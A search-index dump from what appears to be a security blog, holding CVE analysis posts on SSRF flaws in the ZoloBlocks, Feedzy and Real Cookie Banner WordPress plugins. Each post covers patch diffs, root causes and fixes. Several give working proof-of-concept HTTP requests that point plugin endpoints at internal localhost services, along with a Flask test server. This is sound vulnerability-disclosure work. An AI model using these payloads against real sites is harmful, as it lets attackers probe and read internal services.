@app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a POST request with the URL pointing to the local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=zolo_demo_import\u0026json_file_url=http://127.0.0.1:8001/metadata Result: Content read from the local service ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-60161 is an SSRF in demo_import() of ZoloBlocks (≤ 2.3.11) caused by accepting a user-supplied URL and calling wp_remote_get() without validation. The endpoint allows unauthenticated access (wp_ajax_nopriv_...). The issue has been patched in 2.3.12. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Root cause: not validating/whitelisting the URL before calling wp_remote_get(). Impact: sites running ZoloBlocks ≤ 2.3.11; an attacker can query internal services (SSRF). Quick mitigation: update to 2.3.12 or block the zolo_demo_import endpoint. Prevention: whitelist/validate URLs, limit egress, protect AJAX actions with nonces/permissions. ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress ZoloBlocks Plugin \u003c= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Feedzy RSS Aggregator plugin – Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator for WordPress has a Server-Side Request Forgery vulnerability in all versions up to and including 5.1.0 via the function 'feedzy_sanitize_feeds'. This allows an authenticated attacker with Subscriber level access or higher to perform web requests to arbitrary addresses originating from the web application and can be used to query information from internal services. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) and 5.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The Feedzy RSS Aggregator plugin registers a REST API endpoint at /feedzy/v1/feed/ which allows users to submit a URL to fetch feed data. However, in version 5.1.0, this endpoint is weakly protected and the URL filtering mechanism is unsafe, leading to a Server-Side Request Forgery (SSRF) vulnerability. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff feedzy-rss-feeds-gutenberg-block.php - v5.1.0 public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } In the vulnerable version: The endpoint only checks is_user_logged_in(), meaning any logged-in account (including Subscriber) can send requests. The function feedzy_sanitize_feeds() only uses esc_url() — this function sanitizes a URL string for display, but does not validate correctness or restrict access to internal addresses. Bug Therefore, an attacker can send the payload url=http://localhost:8001/admin to coerce the server to send a request to an internal service → SSRF. feedzy-rss-feeds-gutenberg-block.php - v5.1.1 public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } The patch: Restricts REST API access using current_user_can( 'edit_post', $post_id ), allowing only Editors or Admins with the capability to call the endpoint. Replaces esc_url() with wp_http_validate_url(), ensuring the URL is valid, only accepts http/https protocols, and excludes internal addresses (loopback, localhost, 127.0.0.1...). Uses esc_url_raw() to safely store the URL without re-encoding for display. Info The count() in feedzy_sanitize_feeds() requires the input parameter to be Countable or an array. If a string is passed, PHP will throw an error: Bug Exception has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given Therefore, when sending a request to the endpoint, the url parameter must be passed as an array, for example: url[0]=\"http://example.com\" ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code feedzy_rest_route() is registered as the callback for the API: feedzy-rss-feeds-gutenberg-block.php - v5.1.1 public function feedzy_rest_route( $data ) { $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } $meta_args = array( 'date_format' =\u003e get_option( 'date_format' ), 'time_format' =\u003e get_option( 'time_format' ), ); $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) ); $feedy = array(); if ( ! $feed-\u003einit() ) { $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' ); header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); return $feedy; } if ( ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) ) { $feedy['channel'] = null; } else { $feedy['channel'] = array( 'title' =\u003e ( ( $feed-\u003eget_title() ) ? $feed-\u003eget_title() : null ), 'description' =\u003e ( ( $feed-\u003eget_description() ) ? $feed-\u003eget_description() : null ), 'permalink' =\u003e ( ( $feed-\u003eget_permalink() ) ? $feed-\u003eget_permalink() : null ), ); } $feedy['items'] = array(); $items = $feed-\u003eget_items(); $is_multiple = ! empty( $feed-\u003emultifeed_url ) \u0026\u0026 is_array( $feed-\u003emultifeed_url ); foreach ( $items as $item ) { $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item ); array_push( $feedy['items'], array( 'title' =\u003e ( ( $item-\u003eget_title() ) ? $item-\u003eget_title() : null ), 'link' =\u003e ( ( $item-\u003eget_permalink() ) ? $item-\u003eget_permalink() : null ), 'creator' =\u003e ( ( $item-\u003eget_author() ) ? $item-\u003eget_author()-\u003eget_name() : null ), 'source' =\u003e $is_multiple \u0026\u0026 $item-\u003eget_feed()-\u003eget_title() ? $item-\u003eget_feed()-\u003eget_title() : '', 'pubDate' =\u003e ( ( $item-\u003eget_date() ) ? $item-\u003eget_date( 'U' ) : null ), 'date' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['date_format'], $item-\u003eget_date( 'U' ) ) : null ), 'time' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['time_format'], $item-\u003eget_date( 'U' ) ) : null ), 'description' =\u003e isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item-\u003eget_description() ? $item-\u003eget_description() : null ), 'thumbnail' =\u003e $admin-\u003efeedzy_retrieve_image( $item ), 'default_img' =\u003e apply_filters( 'feedzy_default_image', '', $url ), 'price' =\u003e isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null, 'media' =\u003e isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null, 'categories' =\u003e isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null, ) ); } header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); $output = $feedy; return $output; } Logic of the function: Receive and process input data $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } The function checks if the request contains the feeds parameter; it is sanitized via feedzy_sanitize_categories(). If valid, the result is assigned back to $data['url']. Choose the data source $feed with priority if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } If url exists → use it as the main source. If not → use category. → This is where user input (url) is forwarded to the feed fetching process. Prepare variable $url $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } If $feed is not an instance of WP_REST_Request, it is assigned to $url. In practice $feed is usually a URL string or an array of URLs taken from the request. Call core processing function $instance = Feedzy_Rss_Feeds::instance(); $admin = $","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"] B --\u003e C[\"esc_url() → no internal host validation\"] C --\u003e D[\"feedzy_rest_route()\"] D --\u003e E[\"Feedzy_Rss_Feeds::instance()\"] E --\u003e F[\"$admin-\u003efetch_feed(url)\"] F --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"} G -- No --\u003e H[\"init_feed()\"] H --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"] I --\u003e J[\"fetch_data(cache)\"] J --\u003e K[\"HTTP request to user-controlled URL → SSRF\"] graph TD A[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"] B --\u003e C[\"esc_url() → no internal host validation\"] C --\u003e D[\"feedzy_rest_route()\"] D --\u003e E[\"Feedzy_Rss_Feeds::instance()\"] E --\u003e F[\"$admin-\u003efetch_feed(url)\"] F --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"} G -- No --\u003e H[\"init_feed()\"] H --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"] I --\u003e J[\"fetch_data(cache)\"] J --\u003e K[\"HTTP request to user-controlled URL → SSRF\"] graph TD A[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"] B --\u003e C[\"esc_url() → no internal host validation\"] C --\u003e D[\"feedzy_rest_route()\"] D --\u003e E[\"Feedzy_Rss_Feeds::instance()\"] E --\u003e F[\"$admin-\u003efetch_feed(url)\"] F --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"} G -- No --\u003e H[\"init_feed()\"] H --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"] I --\u003e J[\"fetch_data(cache)\"] J --\u003e K[\"HTTP request to user-controlled URL → SSRF\"] graph TD A[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"] B --\u003e C[\"esc_url() → no internal host validation\"] C --\u003e D[\"feedzy_rest_route()\"] D --\u003e E[\"Feedzy_Rss_Feeds::instance()\"] E --\u003e F[\"$admin-\u003efetch_feed(url)\"] F --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"} G -- No --\u003e H[\"init_feed()\"] H --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"] I --\u003e J[\"fetch_data(cache)\"] J --\u003e K[\"HTTP request to user-controlled URL → SSRF\"] ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service using Python from flask import Flask, request, send_from_directory, Response import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/feed', methods=['GET']) def feed(): xml_content = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003crss version=\"2.0\"\u003e \u003cchannel\u003e \u003ctitle\u003eExample Feed\u003c/title\u003e \u003clink\u003ehttps://example.com\u003c/link\u003e \u003cdescription\u003eThis is a sample RSS feed generated by Flask.\u003c/description\u003e \u003citem\u003e \u003ctitle\u003eFirst item\u003c/title\u003e \u003clink\u003ehttps://example.com/item1\u003c/link\u003e \u003cdescription\u003eHello world!\u003c/description\u003e \u003c/item\u003e \u003citem\u003e \u003ctitle\u003eSecond item\u003c/title\u003e \u003clink\u003ehttps://example.com/item2\u003c/link\u003e \u003cdescription\u003eAnother entry.\u003c/description\u003e \u003c/item\u003e \u003c/channel\u003e \u003c/rss\u003e\"\"\" return Response(xml_content, mimetype='application/xml') if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Login with a Contributor account Send a POST request with the URL pointing to the local service: POST /wp-json/feedzy/v1/feed HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F\u0026reauth=1 Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US url[0]=http://localhost:8001/feed\u0026category=cat Result: Content read from the local service Note If trying url with a file that is not XML, we get the response: Result when file is not an XML ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-11128 vulnerability in the Feedzy RSS Aggregator plugin stems from unsafe handling of URLs in the /feedzy/v1/feed REST API. The function feedzy_sanitize_feeds() only used esc_url() and did not validate addresses, allowing an attacker with Subscriber privileges to send SSRF requests to internal services. The 5.1.1 patch fixes this by using wp_http_validate_url(), tightening API access via current_user_can('edit_post', $post_id) and replacing esc_url() with esc_url_raw(). ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways esc_url() is not sufficient to validate incoming URLs. REST APIs must be properly restricted with appropriate permissions. URLs must be validated and filtered to prevent SSRF to internal networks. ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Feedzy Plugin \u003c= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.2.4. The root cause is insufficient validation of the user-supplied URL at the REST API endpoint /scanner/scan-without-login. This allows authenticated attackers with administrator-level access to make web requests to arbitrary locations originating from the web application and can be used to query and modify information from internal services via the url parameter. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) and 5.2.5 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Scanner.php - v5.2.4 public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } In the vulnerable version, routeScanWithoutLogin() takes the url parameter directly from $request-\u003eget_param('url') and uses it in wp_remote_get() without any validation or filtering =\u003e this leads to a Server-Side Request Forgery (SSRF) vulnerability. The response packages the full result from wp_remote_get($url) into JSON: status, statusText: HTTP status code and message. ok: true if status is 2xx. headers: all response headers. redirected, responseUrl: redirect information if present. body: response body content from the URL. =\u003e The server effectively forwards the entire response from the internal URL back to the caller, causing data leakage when SSRF is exploited. Scanner.php - v5.2.5 public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } The patch adds input validation measures to prevent arbitrary URLs: Extract the job’s configured URL $jobDataUrl = $job-\u003edata-\u003eurl; =\u003e Obtain the domain that the job is allowed to operate on. Parse and validate the structure of the user-supplied URL $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } =\u003e Ensure the URL is valid and contains a host. Compare the host with the job’s domain $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } =\u003e If the host differs, return an error instead of proceeding. This restricts requests to the same allowed domain and prevents","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code routeScanWithoutLogin() is registered as the callback for the REST API at /wp-json/\u003cnamespace\u003e/scanner/scan-without-login. Scanner.php register_rest_route( $namespace, '/scanner/scan-without-login', [ 'methods' =\u003e 'GET', 'callback' =\u003e [$this, 'routeScanWithoutLogin'], 'permission_callback' =\u003e [$this, 'permission_callback'], 'args' =\u003e [ 'url' =\u003e [ 'type' =\u003e 'string', 'required' =\u003e true, ], 'jobId' =\u003e [ 'type' =\u003e 'number', 'required' =\u003e true, ], ], ] ); The API uses GET, requires two parameters url (string) and jobId (number). Access is checked via permission_callback(): const MANAGE_MIN_CAPABILITY = 'manage_real_cookie_banner'; public function permission_callback() { return \\current_user_can(Core::MANAGE_MIN_CAPABILITY); } manage_real_cookie_banner is by default assigned to administrator, so the endpoint can only be invoked by users with that capability. The full endpoint path can be discovered by visiting /wp-json and searching for scan-without-login. API containing scan-without-login in /wp-json =\u003e Official endpoint: /wp-json/real-cookie-banner/v1/scanner/scan-without-login Note The job in jobId suggests a running job tracked by jobId. I placed a breakpoint in routeScanWithoutLogin() and tested the feature, routing all requests through the BurpSuite proxy. Scanner is the function that calls this API. Debugger Observing BurpSuite’s HTTP history tab shows the request to the API being captured and listed in HTTP History: Request to API captured in HTTP History ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service with Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use the scanner feature and route requests through BurpSuite with an Administrator user. Capture the request to /wp-json/real-cookie-banner/v1/scanner/scan-without-login. Modify the URL and forward: GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838\u0026_locale=user\u0026url=http://localhost:8001/metadata\u0026jobId=65 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component X-WP-Nonce: 83df92a708 Connection: keep-alive Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951 Result: Content read from local service ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions ≤ 5.2.4 of Real Cookie Banner contain an SSRF vulnerability at the endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login. routeScanWithoutLogin() accepts a url from the client, performs wp_remote_get(), and returns the raw body/headers, allowing an attacker with Administrator privileges (or a compromised admin session) to read and probe internal resources. Version 5.2.5 introduced host/domain checks (comparing the request host with the job’s 